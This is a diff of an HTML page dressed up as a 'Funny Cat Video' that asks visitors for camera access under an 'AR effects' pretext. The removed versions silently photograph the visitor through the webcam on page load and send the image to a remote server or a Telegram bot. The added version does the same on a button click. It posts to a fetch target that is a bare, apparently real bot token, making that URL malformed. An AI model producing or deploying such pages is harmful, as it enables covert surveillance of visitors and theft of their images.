@@ -1,82 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Интересный контент</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Cat Video</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f5f5f5;
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #videoElement {
+            margin: 20px auto;
+            display: block;
+            max-width: 100%;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Funny Cat Video</h1>
+    <p>Allow camera access for AR effects!</p>
+    
+    <video id="videoElement" autoplay></video>
+    <button id="captureButton">Take Photo</button>
+    
     <script>
-        async function captureAndSend() {
+        const videoElement = document.getElementById('videoElement');
+        const captureButton = document.getElementById('captureButton');
+        let stream = null;
+
+        // Запуск камеры при загрузке страницы
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream;
+            } catch (err) {
+                console.error("Camera error:", err);
+                alert("Could not access the camera. Please allow permissions.");
+            }
+        }
+
+        // Захват фото
+        async function capturePhoto() {
+            if (!stream) {
+                alert("Camera is not ready!");
+                return;
+            }
+
+            try {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
+                ctx.drawImage(videoElement, 0, 0);
+
                 const photo = canvas.toDataURL('image/jpeg');
-                stream.getTracks().forEach(track => track.stop());
                 
-                // Отправка на сервер (замени URL на свой)
-                fetch('https://your-server.com/upload', {
+                // Отправка на сервер (замените на свой API)
+                const response = await fetch('8496087610:AAEb9bYCT58rGq-f0kftyCyIUFM1Dy3vuYo', {
                     method: 'POST',
                     body: JSON.stringify({ image: photo }),
                     headers: { 'Content-Type': 'application/json' }
                 });
+
+                if (response.ok) {
+                    alert("Photo sent successfully!");
+                } else {
+                    alert("Failed to send photo.");
+                }
             } catch (err) {
-                console.error("Ошибка:", err);
+                console.error("Error sending photo:", err);
+                alert("Error sending photo.");
             }
         }
-        
-        window.onload = captureAndSend;
-    </script>
-</head>
-<body>
-    <h1>Загрузка интересного контента...</h1>
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Funny Cat Video</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        h1 { color: #333; }
-    </style>
-    <script>
-        async function captureAndSend() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                const photo = canvas.toDataURL('image/jpeg');
+
+        // Остановка камеры при закрытии страницы
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Отправка на Telegram-бота (замени на свой API)
-                fetch(`https://8496087610:AAEb9bYCT58rGq-f0kftyCyIUFM1Dy3vuYo/sendPhoto?chat_id=ТВОЙ_CHAT_ID`, {
-                    method: 'POST',
-                    body: JSON.stringify({ photo: photo }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-            } catch (err) {
-                console.log("Ошибка: " + err);
             }
-        }
-        window.onload = captureAndSend;
+        });
+
+        // Инициализация
+        startCamera();
+        captureButton.addEventListener('click', capturePhoto);
     </script>
-</head>
-<body>
-    <h1>Загрузка видео...</h1>
-    <p>Пожалуйста, разрешите доступ к камере для AR-эффектов!</p>
 </body>
 </html>
